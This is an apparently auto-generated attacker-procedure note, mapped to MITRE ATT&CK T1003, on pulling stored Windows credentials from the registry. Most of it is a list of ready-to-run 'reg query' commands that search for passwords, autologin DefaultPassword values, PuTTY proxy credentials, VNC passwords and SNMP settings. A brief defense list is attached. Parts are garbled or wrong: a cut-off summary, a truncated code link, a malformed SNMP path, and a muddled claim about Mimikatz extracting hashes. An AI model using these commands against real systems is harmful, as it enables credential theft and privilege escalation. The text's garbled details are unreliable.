---
id: 500b3f1f-7d67-4b9c-b24d-17ad20e3f979
name: Windows Password and Credential Query via Registry
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:29.027967+00:00'
updated_at: '2023-04-10T20:37:47.317455+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
techniques:
- '[[Credential Dumping|T1003 - Credential Dumping]]'
tags:
- '[[EoP - Looting for passwords]]'
- '[[Search the registry for key names and passwords]]'
- '[[Windows - Privilege Escalation]]'
commands:
- '[[Query DefaultUserName, DefaultDomainName, and DefaultPassword in HKLM registry]]'
- '[[Query password in HKCU registry]]'
- '[[Query password in HKCU registry]]'
- '[[Query password in HKLM registry]]'
- '[[Query password in HKLM registry]]'
- '[[Query password in RealVNC WinVNC4 in HKLM registry]]'
- '[[Query Putty clear text proxy credentials in HKCU registry]]'
- '[[Query SNMP parameters in HKLM registry]]'
- '[[Query VNC credentials in HKCU registry]]'
- '[[Query Windows Autologin settings]]'
---

# Windows Password and Credential Query via Registry

## Summary

Windows Password and Credential Query via Registry is a technique used by attackers to extract password hashes and credentials stored in the Windows registry. This technique can be used to escalate privileges and gain access to sensitive information. The attacker can use this information to move la

## Description

# Description

Windows Password and Credential Query via Registry is a technique used by attackers to extract password hashes and credentials stored in the Windows registry. This technique can be used to escalate privileges and gain access to sensitive information. The attacker can use this information to move laterally within the network, access other systems, and steal valuable data.

To perform this attack, the attacker must have administrative access to the target system. The attacker can then use a tool like Mimikatz to extract the password hashes and credentials from the registry. This technique is effective against systems that store passwords in the registry, which is common in Windows environments.

The business value of this attack is that it allows the attacker to gain access to sensitive information, which can be used for financial gain or to cause reputational damage to the organization.

## Requirements

1. Administrative access to the target system

1. A tool like Mimikatz to extract the password hashes and credentials from the registry

## Defense

1. Implement strong password policies and avoid storing passwords in the registry

1. Monitor the registry for suspicious activity and unauthorized access

1. Use endpoint detection and response (EDR) tools to detect and respond to attacks that involve registry access

## Objectives

1. Gain access to password hashes and credentials stored in the Windows registry

1. Escalate privileges to gain access to sensitive information

1. Move laterally within the network

# Instructions

1. This command will query the Windows registry for any stored passwords or credentials. It will search for passwords stored in the registry under the keys HKLM and HKCU, and also search for autologin credentials, SNMP parameters, Putty clear text proxy credentials, VNC credentials, and RealVNC WinVNC4 passwords.

**Code**: [[REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG Q]]

> The command uses the REG QUERY command to search for specific values in the Windows registry. The /F flag is used to search for a specific string, in this case "password", and the /t flag specifies the type of value to search for, in this case REG_SZ. The /S flag is used to search the entire registry, and the /K flag specifies to only return the keys that match the search criteria.

The command also uses the findstr command to search for specific values within the output of the Winlogon key search. The 2>nul flag is used to suppress any error messages that may occur during the search.

Overall, this command is useful for identifying any stored passwords or credentials on a Windows system that may be at risk of being compromised.

**Command** ([[Query password in HKLM registry]]):

```bash
REG QUERY HKLM /F \"password\" /t REG_SZ /S /K
```

**Command** ([[Query password in HKCU registry]]):

```bash
REG QUERY HKCU /F \"password\" /t REG_SZ /S /K
```

**Command** ([[Query Windows Autologin settings]]):

```bash
reg query \"HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\"
```

**Command** ([[Query DefaultUserName, DefaultDomainName, and DefaultPassword in HKLM registry]]):

```bash
reg query \"HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\" 2>nul | findstr \"DefaultUserName DefaultDomainName DefaultPassword\"
```

**Command** ([[Query SNMP parameters in HKLM registry]]):

```bash
reg query \"HKLM\SYSTEM\Current\ControlSet\Services\SNMP\"
```

**Command** ([[Query Putty clear text proxy credentials in HKCU registry]]):

```bash
reg query \"HKCU\Software\SimonTatham\PuTTY\Sessions\"
```

**Command** ([[Query VNC credentials in HKCU registry]]):

```bash
reg query \"HKCU\Software\ORL\WinVNC3\Password\"
```

**Command** ([[Query password in RealVNC WinVNC4 in HKLM registry]]):

```bash
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
```

**Command** ([[Query password in HKLM registry]]):

```bash
reg query HKLM /f password /t REG_SZ /s
```

**Command** ([[Query password in HKCU registry]]):

```bash
reg query HKCU /f password /t REG_SZ /s
```

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]

### Techniques

- [[Credential Dumping|T1003 - Credential Dumping]]

## Commands Used

- [[Query DefaultUserName, DefaultDomainName, and DefaultPassword in HKLM registry]]
- [[Query password in HKCU registry]]
- [[Query password in HKCU registry]]
- [[Query password in HKLM registry]]
- [[Query password in HKLM registry]]
- [[Query password in RealVNC WinVNC4 in HKLM registry]]
- [[Query Putty clear text proxy credentials in HKCU registry]]
- [[Query SNMP parameters in HKLM registry]]
- [[Query VNC credentials in HKCU registry]]
- [[Query Windows Autologin settings]]

## Tags

- [[EoP - Looting for passwords]]
- [[Search the registry for key names and passwords]]
- [[Windows - Privilege Escalation]]
